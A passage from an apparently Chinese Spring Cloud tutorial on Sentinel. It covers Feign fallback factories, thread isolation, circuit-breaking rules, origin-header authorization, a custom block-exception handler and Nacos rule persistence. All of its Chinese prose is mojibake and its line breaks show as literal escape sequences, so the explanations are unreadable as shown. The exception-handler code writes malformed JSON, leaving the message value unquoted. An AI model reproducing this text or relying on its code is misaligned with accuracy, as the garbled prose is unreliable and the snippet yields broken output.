å¼€å¯feignå¯¹sentinelçš„æ”¯æŒ\n```\n\n**2ï¼‰ç¼–å†™å¤±è´¥é™çº§é€»è¾‘**\n\nä¸šåŠ¡å¤±è´¥åï¼Œä¸èƒ½ç›´æ¥æŠ¥é”™ï¼Œè€Œåº”è¯¥è¿”å›ç”¨æˆ·ä¸€ä¸ªå‹å¥½æç¤ºæˆ–è€…é»˜è®¤ç»“æœï¼Œè¿™ä¸ªå°±æ˜¯å¤±è´¥é™çº§é€»è¾‘ã€‚æœ‰ä¸¤ç§æ–¹å¼ï¼š\n\nâ‘ æ–¹å¼ä¸€ï¼šFallbackClassï¼Œæ— æ³•å¯¹è¿œç¨‹è°ƒç”¨çš„å¼‚å¸¸åšå¤„ç†\n\nâ‘¡æ–¹å¼äºŒï¼šFallbackFactoryï¼Œå¯ä»¥å¯¹è¿œç¨‹è°ƒç”¨çš„å¼‚å¸¸åšå¤„ç†ï¼Œæˆ‘ä»¬é€‰æ‹©è¿™ç§\n\nè¿™é‡Œæˆ‘ä»¬æ¼”ç¤ºæ–¹å¼äºŒçš„å¤±è´¥é™çº§å¤„ç†ã€‚\n\n**æ­¥éª¤ä¸€**ï¼šåœ¨feing-apié¡¹ç›®ä¸­å®šä¹‰ç±»ï¼Œå®ç°FallbackFactoryï¼š\n\n```java\npackage cn.itcast.feign.clients.fallback;\n\n@Slf4j\npublic class UserClientFallbackFactory implements FallbackFactory<UserClient> {\n    @Override\n    public UserClient create(Throwable throwable) {\n        return new UserClient() {\n            @Override\n            public User findById(Long id) {\n                log.error(\"æŸ¥è¯¢ç”¨æˆ·å¼‚å¸¸\", throwable);\n                return new User();\n            }\n        };\n    }\n}\n```\n\n**æ­¥éª¤äºŒ**ï¼šåœ¨feing-apié¡¹ç›®ä¸­çš„DefaultFeignConfigurationç±»ä¸­å°†UserClientFallbackFactoryæ³¨å†Œä¸ºä¸€ä¸ªBeanï¼š\n\n```java\n@Bean\npublic UserClientFallbackFactory userClientFallbackFactory(){\n    return new UserClientFallbackFactory();\n}\n```\n\n**æ­¥éª¤ä¸‰**ï¼šåœ¨feing-apié¡¹ç›®ä¸­çš„UserClientæ¥å£ä¸­ä½¿ç”¨UserClientFallbackFactoryï¼š\n\n```java\n@FeignClient(value = \"userservice\", fallbackFactory = UserClientFallbackFactory.class)\npublic interface UserClient {\n\n    @GetMapping(\"/user/{id}\")\n    User findById(@PathVariable(\"id\") Long id);\n}\n```\n\né‡å¯åï¼Œè®¿é—®ä¸€æ¬¡è®¢å•æŸ¥è¯¢ä¸šåŠ¡ï¼Œç„¶åæŸ¥çœ‹sentinelæ§åˆ¶å°ï¼Œå¯ä»¥çœ‹åˆ°æ–°çš„ç°‡ç‚¹é“¾è·¯ï¼š\n\n![](https://img.jwt1399.top/img/202210121236062.png)\n\n### â·çº¿ç¨‹éš”ç¦»ï¼ˆèˆ±å£æ¨¡å¼ï¼‰\n\n#### 1.ä¸¤ç§å®ç°æ–¹å¼\n\n- **çº¿ç¨‹æ± éš”ç¦»**ï¼šç»™æ¯ä¸ªæœåŠ¡è°ƒç”¨ä¸šåŠ¡åˆ†é…ä¸€ä¸ªçº¿ç¨‹æ± ï¼Œåˆ©ç”¨çº¿ç¨‹æ± æœ¬èº«å®ç°éš”ç¦»æ•ˆæœ\n\n- **ä¿¡å·é‡éš”ç¦»**ï¼šé‡‡ç”¨è®¡æ•°å™¨æ¨¡å¼ï¼Œè®°å½•ä¸šåŠ¡ä½¿ç”¨çº¿ç¨‹æ•°é‡ï¼Œè¾¾åˆ°ä¿¡å·é‡ä¸Šé™æ—¶ï¼Œç¦æ­¢æ–°è¯·æ±‚(Sentinelé»˜è®¤é‡‡ç”¨)\n\n\n| ä¸¤ç§å®ç°æ–¹å¼                                         | å„ç»„ä¼˜ç¼ºç‚¹                                           |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210121328405.png) | ![](https://img.jwt1399.top/img/202210121328897.png) |\n\n#### 2.sentinelçš„çº¿ç¨‹éš”ç¦»\n\n**ç”¨æ³•è¯´æ˜**ï¼š\n\nåœ¨æ·»åŠ é™æµè§„åˆ™æ—¶ï¼Œå¯ä»¥é€‰æ‹©ä¸¤ç§é˜ˆå€¼ç±»å‹ï¼š\n\n- QPSï¼šæ¯ç§’çš„è¯·æ±‚æ•°ï¼Œåœ¨å¿«é€Ÿå…¥é—¨ä¸­å·²ç»æ¼”ç¤ºè¿‡\n\n- çº¿ç¨‹æ•°ï¼šè¯¥èµ„æºèƒ½ä½¿ç”¨çš„tomcatçº¿ç¨‹æ•°çš„æœ€å¤§å€¼ã€‚ä¹Ÿå°±æ˜¯é€šè¿‡é™åˆ¶çº¿ç¨‹æ•°é‡ï¼Œå®ç°**çº¿ç¨‹éš”ç¦»**ï¼ˆèˆ±å£æ¨¡å¼ï¼‰ã€‚\n\n![](https://img.jwt1399.top/img/202210121340548.png)\n\n\n\n**å®ä¾‹ç»ƒä¹ ï¼š**\n\n> éœ€æ±‚ï¼šç»™ order-service æœåŠ¡ä¸­çš„UserClientçš„æŸ¥è¯¢ç”¨æˆ·æ¥å£è®¾ç½®æµæ§è§„åˆ™ï¼Œçº¿ç¨‹æ•°ä¸èƒ½è¶…è¿‡ 2ã€‚ç„¶ååˆ©ç”¨jmeteræµ‹è¯•ã€‚\n\n 1ï¼‰é…ç½®éš”ç¦»è§„åˆ™ï¼Œé€‰æ‹©feignæ¥å£åé¢çš„æµæ§æŒ‰é’®ï¼š\n\n![](https://img.jwt1399.top/img/202210121344508.png)\n\nå¡«å†™è¡¨å•ï¼š\n\n![](https://img.jwt1399.top/img/202210121344944.png)\n\n2ï¼‰Jmeteræµ‹è¯•ï¼Œé€‰æ‹©`é˜ˆå€¼ç±»å‹-çº¿ç¨‹æ•°<2`ï¼š\n\n![](https://img.jwt1399.top/img/202210121344384.png)\n\nä¸€æ¬¡å‘ç”Ÿ10ä¸ªè¯·æ±‚ï¼Œæœ‰è¾ƒå¤§æ¦‚ç‡å¹¶å‘çº¿ç¨‹æ•°è¶…è¿‡2ï¼Œè€Œè¶…å‡ºçš„è¯·æ±‚ä¼šèµ°ä¹‹å‰å®šä¹‰çš„å¤±è´¥é™çº§é€»è¾‘ã€‚\n\næŸ¥çœ‹è¿è¡Œç»“æœï¼š\n\n![](https://img.jwt1399.top/img/202210121344849.png)\n\nå‘ç°è™½ç„¶ç»“æœéƒ½æ˜¯é€šè¿‡äº†ï¼Œä¸è¿‡éƒ¨åˆ†è¯·æ±‚å¾—åˆ°çš„å“åº”æ˜¯é™çº§è¿”å›çš„nullä¿¡æ¯ã€‚\n\n### â¸ç†”æ–­é™çº§\n\n#### 1.ç®€ä»‹\n\nç†”æ–­é™çº§æ˜¯è§£å†³é›ªå´©é—®é¢˜çš„é‡è¦æ‰‹æ®µã€‚å…¶æ€è·¯æ˜¯ç”±**æ–­è·¯å™¨**ç»Ÿè®¡æœåŠ¡è°ƒç”¨çš„å¼‚å¸¸æ¯”ä¾‹ã€æ…¢è¯·æ±‚æ¯”ä¾‹ï¼Œå¦‚æœè¶…å‡ºé˜ˆå€¼åˆ™ä¼š**ç†”æ–­**è¯¥æœåŠ¡ã€‚å³æ‹¦æˆªè®¿é—®è¯¥æœåŠ¡çš„ä¸€åˆ‡è¯·æ±‚ï¼›è€Œå½“æœåŠ¡æ¢å¤æ—¶ï¼Œæ–­è·¯å™¨ä¼šæ”¾è¡Œè®¿é—®è¯¥æœåŠ¡çš„è¯·æ±‚ã€‚\n\næ–­è·¯å™¨æ§åˆ¶ç†”æ–­å’Œæ”¾è¡Œæ˜¯é€šè¿‡çŠ¶æ€æœºæ¥å®Œæˆçš„ï¼š\n\n![](https://img.jwt1399.top/img/202210121349749.png)\n\nçŠ¶æ€æœºåŒ…æ‹¬ä¸‰ä¸ªçŠ¶æ€ï¼š\n\n- closedï¼šå…³é—­çŠ¶æ€ï¼Œæ–­è·¯å™¨æ”¾è¡Œæ‰€æœ‰è¯·æ±‚ï¼Œå¹¶å¼€å§‹ç»Ÿè®¡å¼‚å¸¸æ¯”ä¾‹ã€æ…¢è¯·æ±‚æ¯”ä¾‹ã€‚è¶…è¿‡é˜ˆå€¼åˆ™åˆ‡æ¢åˆ°opençŠ¶æ€\n- openï¼šæ‰“å¼€çŠ¶æ€ï¼ŒæœåŠ¡è°ƒç”¨è¢«**ç†”æ–­**ï¼Œè®¿é—®è¢«ç†”æ–­æœåŠ¡çš„è¯·æ±‚ä¼šè¢«æ‹’ç»ï¼Œå¿«é€Ÿå¤±è´¥ï¼Œç›´æ¥èµ°é™çº§é€»è¾‘ã€‚OpençŠ¶æ€5ç§’åä¼šè¿›å…¥half-opençŠ¶æ€\n- half-openï¼šåŠå¼€çŠ¶æ€ï¼Œæ”¾è¡Œä¸€æ¬¡è¯·æ±‚ï¼Œæ ¹æ®æ‰§è¡Œç»“æœæ¥åˆ¤æ–­æ¥ä¸‹æ¥çš„æ“ä½œã€‚\n  - è¯·æ±‚æˆåŠŸï¼šåˆ™åˆ‡æ¢åˆ°closedçŠ¶æ€\n  - è¯·æ±‚å¤±è´¥ï¼šåˆ™åˆ‡æ¢åˆ°opençŠ¶æ€\n\næ–­è·¯å™¨ç†”æ–­ç­–ç•¥æœ‰ä¸‰ç§ï¼šæ…¢è°ƒç”¨ã€å¼‚å¸¸æ¯”ä¾‹ã€å¼‚å¸¸æ•°\n\n#### 2.æ…¢è°ƒç”¨\n\n> ä¸šåŠ¡çš„å“åº”æ—¶é•¿ï¼ˆRTï¼‰å¤§äºæŒ‡å®šæ—¶é•¿çš„è¯·æ±‚è®¤å®šä¸ºæ˜¯æ…¢è°ƒç”¨è¯·æ±‚ã€‚\n>\n> åœ¨æŒ‡å®šæ—¶é—´å†…ï¼Œå¦‚æœè¯·æ±‚æ•°é‡è¶…è¿‡è®¾å®šçš„æœ€å°æ•°é‡ï¼Œæ…¢è°ƒç”¨æ¯”ä¾‹å¤§äºè®¾å®šçš„é˜ˆå€¼ï¼Œåˆ™è§¦å‘ç†”æ–­ã€‚\n\nä¾‹å¦‚ï¼š\n\n![](https://img.jwt1399.top/img/202210121355334.png)\n\nè§£è¯»ï¼šRTè¶…è¿‡500msçš„è°ƒç”¨æ˜¯æ…¢è°ƒç”¨ï¼Œç»Ÿè®¡æœ€è¿‘10000mså†…çš„è¯·æ±‚ï¼Œå¦‚æœè¯·æ±‚é‡è¶…è¿‡10æ¬¡ï¼Œå¹¶ä¸”æ…¢è°ƒç”¨æ¯”ä¾‹ä¸ä½äº0.5ï¼Œåˆ™è§¦å‘ç†”æ–­ï¼Œç†”æ–­æ—¶é•¿ä¸º5ç§’ã€‚ç„¶åè¿›å…¥half-opençŠ¶æ€ï¼Œæ”¾è¡Œä¸€æ¬¡è¯·æ±‚åšæµ‹è¯•ã€‚\n\n**å®ä¾‹ç»ƒä¹ **\n\n> éœ€æ±‚ï¼šç»™ UserClientçš„æŸ¥è¯¢ç”¨æˆ·æ¥å£è®¾ç½®é™çº§è§„åˆ™ï¼Œæ…¢è°ƒç”¨çš„RTé˜ˆå€¼ä¸º50msï¼Œç»Ÿè®¡æ—¶é—´ä¸º1ç§’ï¼Œæœ€å°è¯·æ±‚æ•°é‡ä¸º5ï¼Œå¤±è´¥é˜ˆå€¼æ¯”ä¾‹ä¸º0.4ï¼Œç†”æ–­æ—¶é•¿ä¸º5\n\n1ï¼‰è®¾ç½®æ…¢è°ƒç”¨\n\nä¿®æ”¹user-serviceä¸­çš„/user/{id}è¿™ä¸ªæ¥å£çš„ä¸šåŠ¡ã€‚é€šè¿‡ä¼‘çœ æ¨¡æ‹Ÿä¸€ä¸ªå»¶è¿Ÿæ—¶é—´ï¼š\n\n![](https://img.jwt1399.top/img/202210121359370.png)\n\n| orderId=101çš„è®¢å•ï¼Œå…³è”çš„æ˜¯idä¸º1çš„ç”¨æˆ·ï¼Œè°ƒç”¨æ—¶é•¿ä¸º60ms | orderId=102çš„è®¢å•ï¼Œå…³è”çš„æ˜¯idä¸º2çš„ç”¨æˆ·ï¼Œè°ƒç”¨æ—¶é•¿ä¸ºéå¸¸çŸ­ |\n| ------------------------------------------------------ | -------------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210121359056.png)   | ![](https://img.jwt1399.top/img/202210121359372.png)     |\n\n2ï¼‰è®¾ç½®ç†”æ–­è§„åˆ™ï¼Œç»™feignæ¥å£è®¾ç½®é™çº§è§„åˆ™ï¼š\n\n| ![](https://img.jwt1399.top/img/202210121404112.png) |\n| ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210121404992.png) |\n\n3ï¼‰æµ‹è¯•\n\nåœ¨æµè§ˆå™¨è®¿é—®ï¼šhttp://localhost:8088/order/101ï¼Œå¿«é€Ÿåˆ·æ–°5æ¬¡ï¼Œå¯ä»¥å‘ç°ï¼š\n\n![](https://img.jwt1399.top/img/202210121411264.png)\n\nè§¦å‘äº†ç†”æ–­ï¼Œè¯·æ±‚æ—¶é•¿ç¼©çŸ­è‡³5msï¼Œå¿«é€Ÿå¤±è´¥äº†ï¼Œå¹¶ä¸”èµ°é™çº§é€»è¾‘ï¼Œè¿”å›çš„null\n\n\n\nåœ¨æµè§ˆå™¨è®¿é—®ï¼šhttp://localhost:8088/order/102ï¼Œç«Ÿç„¶ä¹Ÿè¢«ç†”æ–­äº†ï¼š\n\n![](https://img.jwt1399.top/img/202210121411138.png)\n\n#### 3.å¼‚å¸¸æ¯”ä¾‹ã€å¼‚å¸¸æ•°\n\n> ç»Ÿè®¡æŒ‡å®šæ—¶é—´å†…çš„è°ƒç”¨ï¼Œå¦‚æœè°ƒç”¨æ¬¡æ•°è¶…è¿‡æŒ‡å®šè¯·æ±‚æ•°ï¼Œå¹¶ä¸”å‡ºç°å¼‚å¸¸çš„æ¯”ä¾‹è¾¾åˆ°è®¾å®šçš„æ¯”ä¾‹é˜ˆå€¼ï¼ˆæˆ–è¶…è¿‡æŒ‡å®šå¼‚å¸¸æ•°ï¼‰ï¼Œåˆ™è§¦å‘ç†”æ–­ã€‚\n\nå¼‚å¸¸æ¯”ä¾‹è®¾ç½®ï¼š\n\n![](https://img.jwt1399.top/img/202210121417504.png)\n\nè§£è¯»ï¼šç»Ÿè®¡æœ€è¿‘1000mså†…çš„è¯·æ±‚ï¼Œå¦‚æœè¯·æ±‚é‡è¶…è¿‡10æ¬¡ï¼Œå¹¶ä¸”å¼‚å¸¸æ¯”ä¾‹ä¸ä½äº0.4ï¼Œåˆ™è§¦å‘ç†”æ–­ã€‚\n\nå¼‚å¸¸æ•°è®¾ç½®ï¼š\n\n![](https://img.jwt1399.top/img/202210121417568.png)\n\nè§£è¯»ï¼šç»Ÿè®¡æœ€è¿‘1000mså†…çš„è¯·æ±‚ï¼Œå¦‚æœè¯·æ±‚é‡è¶…è¿‡10æ¬¡ï¼Œå¹¶ä¸”å¼‚å¸¸æ•°ä¸ä½äº2æ¬¡ï¼Œåˆ™è§¦å‘ç†”æ–­ã€‚\n\n**å®ä¾‹ç»ƒä¹ **\n\n> éœ€æ±‚ï¼šç»™ UserClientçš„æŸ¥è¯¢ç”¨æˆ·æ¥å£è®¾ç½®é™çº§è§„åˆ™ï¼Œç»Ÿè®¡æ—¶é—´ä¸º1ç§’ï¼Œæœ€å°è¯·æ±‚æ•°é‡ä¸º5ï¼Œå¤±è´¥é˜ˆå€¼æ¯”ä¾‹ä¸º0.4ï¼Œç†”æ–­æ—¶é•¿ä¸º5s\n\n 1ï¼‰è®¾ç½®å¼‚å¸¸è¯·æ±‚\n\né¦–å…ˆï¼Œä¿®æ”¹user-serviceä¸­çš„/user/{id}è¿™ä¸ªæ¥å£çš„ä¸šåŠ¡ã€‚æ‰‹åŠ¨æŠ›å‡ºå¼‚å¸¸ï¼Œä»¥è§¦å‘å¼‚å¸¸æ¯”ä¾‹çš„ç†”æ–­ï¼š\n\n![](https://img.jwt1399.top/img/202210121417647.png)\n\n2ï¼‰è®¾ç½®ç†”æ–­è§„åˆ™ï¼Œç»™feignæ¥å£è®¾ç½®é™çº§è§„åˆ™ï¼š\n\n| ![](https://img.jwt1399.top/img/202210121417770.png) |\n| ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210121417510.png) |\n\nåœ¨5æ¬¡è¯·æ±‚ä¸­ï¼Œåªè¦å¼‚å¸¸æ¯”ä¾‹è¶…è¿‡0.4ï¼Œä¹Ÿå°±æ˜¯æœ‰2æ¬¡ä»¥ä¸Šçš„å¼‚å¸¸ï¼Œå°±ä¼šè§¦å‘ç†”æ–­ã€‚\n\n3ï¼‰æµ‹è¯•\n\nåœ¨æµè§ˆå™¨å¿«é€Ÿè®¿é—®ï¼šhttp://localhost:8088/order/102ï¼Œå¿«é€Ÿåˆ·æ–°5æ¬¡ï¼Œè§¦å‘ç†”æ–­ï¼š\n\n![](https://img.jwt1399.top/img/202210121418855.png)\n\næ­¤æ—¶ï¼Œæˆ‘ä»¬å»è®¿é—®æœ¬æ¥åº”è¯¥æ­£å¸¸çš„103ï¼š\n\n![](https://img.jwt1399.top/img/202210121418963.png)\n\n## â‘£æˆæƒè§„åˆ™\n\n### â¶ç®€ä»‹\n\næˆæƒè§„åˆ™å¯ä»¥å¯¹è¯·æ±‚æ–¹æ¥æºåšåˆ¤æ–­å’Œæ§åˆ¶ã€‚æœ‰ç™½åå•å’Œé»‘åå•ä¸¤ç§æ–¹å¼ã€‚\n\n- ç™½åå•ï¼šæ¥æºï¼ˆoriginï¼‰åœ¨ç™½åå•å†…çš„è°ƒç”¨è€…å…è®¸è®¿é—®\n\n- é»‘åå•ï¼šæ¥æºï¼ˆoriginï¼‰åœ¨é»‘åå•å†…çš„è°ƒç”¨è€…ä¸å…è®¸è®¿é—®\n\nç‚¹å‡»å·¦ä¾§èœå•çš„æˆæƒï¼Œå¯ä»¥çœ‹åˆ°æˆæƒè§„åˆ™ï¼š\n\n![](../images/SpringCloud-é«˜çº§ç¯‡/image-20221013155050038.png)\n\n- èµ„æºåï¼šå°±æ˜¯å—ä¿æŠ¤çš„èµ„æºï¼Œä¾‹å¦‚/order/{orderId}\n\n- æµæ§åº”ç”¨ï¼šæ˜¯æ¥æºè€…çš„åå•ï¼Œ\n  - å¦‚æœæ˜¯å‹¾é€‰ç™½åå•ï¼Œåˆ™åå•ä¸­çš„æ¥æºè¢«è®¸å¯è®¿é—®ã€‚\n  - å¦‚æœæ˜¯å‹¾é€‰é»‘åå•ï¼Œåˆ™åå•ä¸­çš„æ¥æºè¢«ç¦æ­¢è®¿é—®ã€‚\n\næ¯”å¦‚ï¼šæˆ‘ä»¬å…è®¸è¯·æ±‚ä»gatewayåˆ°order-serviceï¼Œä¸å…è®¸æµè§ˆå™¨è®¿é—®order-serviceï¼Œé‚£ä¹ˆç™½åå•ä¸­å°±è¦å¡«å†™**ç½‘å…³çš„æ¥æºåç§°ï¼ˆoriginï¼‰**\n\n![](https://img.jwt1399.top/img/202210131552378.png)\n\n### â·å¦‚ä½•è·å–origin\n\nSentinelæ˜¯é€šè¿‡`RequestOriginParser`è¿™ä¸ªæ¥å£çš„`parseOrigin`æ¥è·å–è¯·æ±‚çš„æ¥æºçš„ã€‚\n\n```java\npublic interface RequestOriginParser {\n    /**\n     * ä»è¯·æ±‚requestå¯¹è±¡ä¸­è·å–originï¼Œè·å–æ–¹å¼è‡ªå®šä¹‰\n     */\n    String parseOrigin(HttpServletRequest request);\n}\n```\n\nè¿™ä¸ªæ–¹æ³•çš„ä½œç”¨å°±æ˜¯ä»requestå¯¹è±¡ä¸­ï¼Œè·å–è¯·æ±‚è€…çš„originå€¼å¹¶è¿”å›ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œsentinelä¸ç®¡è¯·æ±‚è€…ä»å“ªé‡Œæ¥ï¼Œè¿”å›å€¼æ°¸è¿œæ˜¯defaultï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€åˆ‡è¯·æ±‚çš„æ¥æºéƒ½è¢«è®¤ä¸ºæ˜¯ä¸€æ ·çš„å€¼defaultã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå®šä¹‰è¿™ä¸ªæ¥å£çš„å®ç°ï¼Œè®©**ä¸åŒçš„è¯·æ±‚ï¼Œè¿”å›ä¸åŒçš„origin**ã€‚\n\nä¾‹å¦‚order-serviceæœåŠ¡ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªRequestOriginParserçš„å®ç°ç±»ï¼š\n\n```java\npackage cn.itcast.order.sentinel;\n\n@Component\npublic class HeaderOriginParser implements RequestOriginParser {\n    @Override\n    public String parseOrigin(HttpServletRequest request) {\n        // 1.è·å–è¯·æ±‚å¤´\n        String origin = request.getHeader(\"origin\");\n        // 2.éç©ºåˆ¤æ–­\n        if (StringUtils.isEmpty(origin)) {\n            origin = \"blank\";\n        }\n        return origin;\n    }\n}\n```\n\n### â¸ç»™ç½‘å…³æ·»åŠ è¯·æ±‚å¤´\n\næ—¢ç„¶è·å–è¯·æ±‚originçš„æ–¹å¼æ˜¯ä»reques-headerä¸­è·å–originå€¼ï¼Œæˆ‘ä»¬å¿…é¡»è®©**æ‰€æœ‰ä»gatewayè·¯ç”±åˆ°å¾®æœåŠ¡çš„è¯·æ±‚éƒ½å¸¦ä¸Šoriginå¤´**ã€‚è¿™ä¸ªéœ€è¦åˆ©ç”¨ä¹‹å‰å­¦ä¹ çš„ä¸€ä¸ª`GatewayFilter`æ¥å®ç°ï¼Œ`AddRequestHeaderGatewayFilter`ã€‚\n\nä¿®æ”¹gatewayæœåŠ¡ä¸­çš„application.ymlï¼Œæ·»åŠ ä¸€ä¸ªdefaultFilterï¼š\n\n```yaml\nspring:\n  cloud:\n    gateway:\n      default-filters:\n        - AddRequestHeader=origin,gateway\n      routes:\n       # ...ç•¥\n```\n\nè¿™æ ·ä»gatewayè·¯ç”±çš„æ‰€æœ‰è¯·æ±‚éƒ½ä¼šå¸¦ä¸Šoriginå¤´ï¼Œå€¼ä¸ºgatewayã€‚è€Œä»å…¶å®ƒåœ°æ–¹åˆ°è¾¾å¾®æœåŠ¡çš„è¯·æ±‚åˆ™æ²¡æœ‰è¿™ä¸ªå¤´ã€‚\n\n### â¹é…ç½®æˆæƒè§„åˆ™\n\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªæˆæƒè§„åˆ™ï¼Œæ”¾è¡Œoriginå€¼ä¸ºgatewayçš„è¯·æ±‚ã€‚\n\n| ![](https://img.jwt1399.top/img/202210131558678.png) |\n| ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210131558364.png) |\n\n| è·³è¿‡ç½‘å…³è®¿é—®order-serviceæœåŠ¡                        | é€šè¿‡ç½‘å…³è®¿é—®order-serviceæœåŠ¡                        |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210131559792.png) | ![](https://img.jwt1399.top/img/202210131559893.png) |\n\n\n\n## â‘¤è‡ªå®šä¹‰å¼‚å¸¸ç»“æœ\n\n> é»˜è®¤æƒ…å†µä¸‹ï¼Œå‘ç”Ÿé™æµã€é™çº§ã€æˆæƒæ‹¦æˆªæ—¶ï¼Œéƒ½ä¼šæŠ›å‡ºå¼‚å¸¸åˆ°è°ƒç”¨æ–¹ã€‚å¼‚å¸¸ç»“æœéƒ½æ˜¯flow limmitingï¼ˆé™æµï¼‰ã€‚è¿™æ ·ä¸å¤Ÿå‹å¥½ï¼Œæ— æ³•å¾—çŸ¥æ˜¯é™æµè¿˜æ˜¯é™çº§è¿˜æ˜¯æˆæƒæ‹¦æˆªã€‚\n\n### â¶å¼‚å¸¸ç±»å‹\n\nå¦‚æœè¦è‡ªå®šä¹‰å¼‚å¸¸æ—¶çš„è¿”å›ç»“æœï¼Œéœ€è¦å®ç°`BlockExceptionHandler`æ¥å£ï¼š\n\n```java\npublic interface BlockExceptionHandler {\n    /**\n     * å¤„ç†è¯·æ±‚è¢«é™æµã€é™çº§ã€æˆæƒæ‹¦æˆªæ—¶æŠ›å‡ºçš„å¼‚å¸¸ï¼šBlockException\n     */\n    void handle(HttpServletRequest request, HttpServletResponse response, BlockException e) throws Exception;\n}\n```\n\nè¿™ä¸ªæ–¹æ³•æœ‰ä¸‰ä¸ªå‚æ•°ï¼š\n\n- HttpServletRequest requestï¼šrequestå¯¹è±¡\n- HttpServletResponse responseï¼šresponseå¯¹è±¡\n- BlockException eï¼šè¢«sentinelæ‹¦æˆªæ—¶æŠ›å‡ºçš„å¼‚å¸¸\n\nè¿™é‡Œçš„BlockExceptionåŒ…å«å¤šä¸ªä¸åŒçš„å­ç±»ï¼š\n\n| **å¼‚å¸¸**             | **è¯´æ˜**           |\n| -------------------- | ------------------ |\n| FlowException        | é™æµå¼‚å¸¸           |\n| ParamFlowException   | çƒ­ç‚¹å‚æ•°é™æµçš„å¼‚å¸¸ |\n| DegradeException     | é™çº§å¼‚å¸¸           |\n| AuthorityException   | æˆæƒè§„åˆ™å¼‚å¸¸       |\n| SystemBlockException | ç³»ç»Ÿè§„åˆ™å¼‚å¸¸       |\n\n### â·å¼‚å¸¸å¤„ç†\n\nä¸‹é¢ï¼Œæˆ‘ä»¬å°±åœ¨order-serviceå®šä¹‰ä¸€ä¸ªè‡ªå®šä¹‰å¼‚å¸¸å¤„ç†ç±»ï¼š\n\n```java\npackage cn.itcast.order.sentinel;\n\n@Component\npublic class SentinelExceptionHandler implements BlockExceptionHandler {\n    @Override\n    public void handle(HttpServletRequest request, HttpServletResponse response, BlockException e) throws Exception {\n        String msg = \"æœªçŸ¥å¼‚å¸¸\";\n        int status = 429;\n\n        if (e instanceof FlowException) {\n            msg = \"è¯·æ±‚è¢«é™æµäº†\";\n        } else if (e instanceof ParamFlowException) {\n            msg = \"è¯·æ±‚è¢«çƒ­ç‚¹å‚æ•°é™æµ\";\n        } else if (e instanceof DegradeException) {\n            msg = \"è¯·æ±‚è¢«é™çº§äº†\";\n        } else if (e instanceof AuthorityException) {\n            msg = \"æ²¡æœ‰æƒé™è®¿é—®\";\n            status = 401;\n        }\n\n        response.setContentType(\"application/json;charset=utf-8\");\n        response.setStatus(status);\n        response.getWriter().println(\"{\\\"msg\\\": \" + msg + \", \\\"status\\\": \" + status + \"}\");\n    }\n}\n```\n\né‡å¯æµ‹è¯•ï¼Œåœ¨ä¸åŒåœºæ™¯ä¸‹ï¼Œä¼šè¿”å›ä¸åŒçš„å¼‚å¸¸æ¶ˆæ¯ã€‚\n\n| é™æµï¼š                                               | æˆæƒæ‹¦æˆªï¼š                                           |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210131607851.png) | ![](https://img.jwt1399.top/img/202210131607100.png) |\n\n## â‘¥è§„åˆ™æŒä¹…åŒ–\n\n### â¶ç®€ä»‹\n\nç°åœ¨ï¼Œsentinelçš„æ‰€æœ‰è§„åˆ™éƒ½æ˜¯å†…å­˜å­˜å‚¨ï¼Œé‡å¯åæ‰€æœ‰è§„åˆ™éƒ½ä¼šä¸¢å¤±ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹ï¼Œæˆ‘ä»¬å¿…é¡»ç¡®ä¿è¿™äº›è§„åˆ™çš„æŒä¹…åŒ–ï¼Œé¿å…ä¸¢å¤±ã€‚\n\nè§„åˆ™æ˜¯å¦èƒ½æŒä¹…åŒ–ï¼Œå–å†³äºè§„åˆ™ç®¡ç†æ¨¡å¼ï¼Œsentinelæ”¯æŒä¸‰ç§è§„åˆ™ç®¡ç†æ¨¡å¼ï¼š\n\n- åŸå§‹æ¨¡å¼ï¼šSentinelçš„é»˜è®¤æ¨¡å¼ï¼Œå°†è§„åˆ™ä¿å­˜åœ¨å†…å­˜ï¼Œé‡å¯æœåŠ¡ä¼šä¸¢å¤±ã€‚\n- pullæ¨¡å¼\n- pushæ¨¡å¼\n\n### â·pullæ¨¡å¼\n\npullæ¨¡å¼ï¼šæ§åˆ¶å°å°†é…ç½®çš„è§„åˆ™æ¨é€åˆ°Sentinelå®¢æˆ·ç«¯ï¼Œè€Œå®¢æˆ·ç«¯ä¼šå°†é…ç½®è§„åˆ™ä¿å­˜åœ¨æœ¬åœ°æ–‡ä»¶æˆ–æ•°æ®åº“ä¸­ã€‚ä»¥åä¼šå®šæ—¶å»æœ¬åœ°æ–‡ä»¶æˆ–æ•°æ®åº“ä¸­æŸ¥è¯¢ï¼Œæ›´æ–°æœ¬åœ°è§„åˆ™ã€‚\n\n![](https://img.jwt1399.top/img/202210131614663.png)\n\n### â¸pushæ¨¡å¼\n\npushæ¨¡å¼ï¼šæ§åˆ¶å°å°†é…ç½®è§„åˆ™æ¨é€åˆ°è¿œç¨‹é…ç½®ä¸­å¿ƒï¼Œä¾‹å¦‚Nacosã€‚Sentinelå®¢æˆ·ç«¯ç›‘å¬Nacosï¼Œè·å–é…ç½®å˜æ›´çš„æ¨é€æ¶ˆæ¯ï¼Œå®Œæˆæœ¬åœ°é…ç½®æ›´æ–°ã€‚\n\n<img src=\"https://img.jwt1399.top/img/202210131614311.png\" style=\"zoom: 67%;\" />\n\n> éœ€æ±‚ï¼šä¿®æ”¹OrderServiceï¼Œè®©å…¶ç›‘å¬Nacosä¸­çš„sentinelè§„åˆ™é…ç½®ã€‚\n\n#### 1.å¼•å…¥ä¾èµ–\n\nåœ¨order-serviceä¸­å¼•å…¥sentinelç›‘å¬nacosçš„ä¾èµ–ï¼š\n\n```xml\n<dependency>\n    <groupId>com.alibaba.csp</groupId>\n    <artifactId>sentinel-datasource-nacos</artifactId>\n</dependency>\n```\n\n#### 